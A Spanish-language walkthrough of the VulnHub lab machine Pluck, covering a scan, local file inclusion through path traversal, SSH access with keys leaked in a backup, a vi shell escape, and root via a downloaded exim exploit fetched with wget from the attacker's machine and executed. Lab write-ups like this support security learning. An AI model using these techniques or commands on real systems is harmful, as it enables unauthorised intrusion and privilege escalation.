# Pluck

Hoy vamos a resolver la maquina Pluck, donde estaremos tocando conceptos de explotación a través de LFI, así como escalada de privilegios a través de un script basico en bash.

Plataforma/Source: VulnHub

Dificultad: Beginner

Meta: Obtener un shell root, es decir (root@localhost:~#) y luego obtener la bandera en /root

Iniciamos haciendo ping a la IP para asegurarnos que la maquina esté activa, tuve problemas con herramientas como arp-scan o netdiscover, así que me cree un script para escanear mi red local:

También he decidido añadir una resolución DNS local con el siguiente comando:
***
- Iniciamos haciendo ping a la IP para asegurarnos que la maquina esté activa. Esta maquina ya te muestra la IP al momento de arrancar el sistema, pero igual prefiero utilizar mi  [script](https://github.com/JoseVazquez101/My-scr1pt5/blob/main/hostscan.sh) para escanear mi red local y asegurarme que todo vaya en orden.

- Añadimos una resolución DNS local con el siguiente comando:
  ~~~bash
  echo '192.168.17.135  sumo.vh' >> /etc/hosts
  ~~~
- Si todo funciona, llegaría la hora de realizar el escaneo con nmap, con los siguientes parámetros:
~~~ bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV pluck.vh
~~~
- Vemos que hay cuatro servicios activos, entre los cuales parecen encontrarse ssh, http, mysql y mDNS:
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/99846ec6-826e-47cf-8d53-bb9066cefb45)

- La pagina web tramita sus solicitudes a través del campo de la URL, indicando que pagina visita de esta forma:
  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/290e1d40-4137-457b-83dd-ac492c76933d)

  - Esto puede derivar a una LFI si nos permite apuntar a recursos fuera de la carpeta anterior, indicando con `../` que queremos movernos hacia atrás:
  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/bdbdd0d1-f04c-49f4-ac18-085911e06113)

  - Hasta abajo, observamos que hay una ruta absoluta a lo que parece ser un script para backups, por lo que podremos echar un vistazo a su contenido:
    ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/56541255-1260-4c2d-bf80-355e130bc8be)
   
- Parece ejecutar una serie de comandos, pero eso no importa mucho. Vemos que nos dice que podemos obtener el recurso via `tFTP`, el cual es un protocolo upd parecido a FTP. Nos conectamos y obtenemos el recurso.
  ![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/64820d2b-c213-4028-af1c-ac36328d1927)

- Podemos analizarlo si lo descomprimimos con:
~~~bash
7z x backup.tar
~~~

- Son varias carpetas, pero en una podemos ver pares de llaves, posiblemente pares de llaves publicas y privadas de ssh.
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/48b21c4b-aa42-4a57-b480-897cad7fa0c2)

- Si listamos los contenidos, parecen cambiar en que algunas utilizan DSS y otras RSA para cifrarlas, en este punto probé todas las claves publicas hasta que alguna resultara valida, pues todas son del usuario Paul

~~~ bash
ssh paul@pluck.vh -i <pub_key>
~~~

- En este caso, si disponemos de la clave privada correcta alojada en el servidor victima, no nos debería pedir proporcionar una contraseña:
- Finalmente con una de las llaves podemos acceder, pero este usuario no poseé una bash, sino algo llamado pdmenu:
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/19a4dcc7-277f-4668-8a3e-d13529a1f0cb)

- Tenemos un modulo para editar archivos, y este utiliza vi. Según [GTFOBins](https://gtfobins.github.io/gtfobins/vi/) existe una manera para hacer que este binario nos lance una bash.
- Nos metemos a cualquier archivo para editar, ya sea /etc/passwd y presionamos SHIFT+: para insertar las siguientes variables
~~~bash
:set shell=/bin/sh
:shell
~~~

***

<h3>PrivEsc</h3>
- Ya con completa libertad de movilidad, empecemos con listar los permisos SUID.
~~~ bash
find / -perm -4000 2>/dev/null
~~~
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/9b43745d-98cc-46a7-992a-1f9e29641298)

- Vemos un binario `exim`, el cual es empleado para servicios de correo en equipos Unix
	- Exim: https://www.exim.org/
- Nos deja ver la versión, así que podríamos intentar ver si existe algún exploit conocido en searchsploit, así que lo movemos y pasamos a la maquina victima:

- Maquina local:
  ~~~bash
  searchsploit -m linux/local/39535.sh
  python3 -m http.server 9999
  wget 192.168.17.128:9999/39535.sh
  mv 39535.sh exploit.sh
  chmod +x exploit.sh
  ./exploit.sh
  ~~~
- Y con esto ya seriamos root :D

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/aabef773-920f-4f7b-ad63-5785a4f81be1)
![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/ae56085a-d6a3-4b3e-b1f9-28142195dff0)

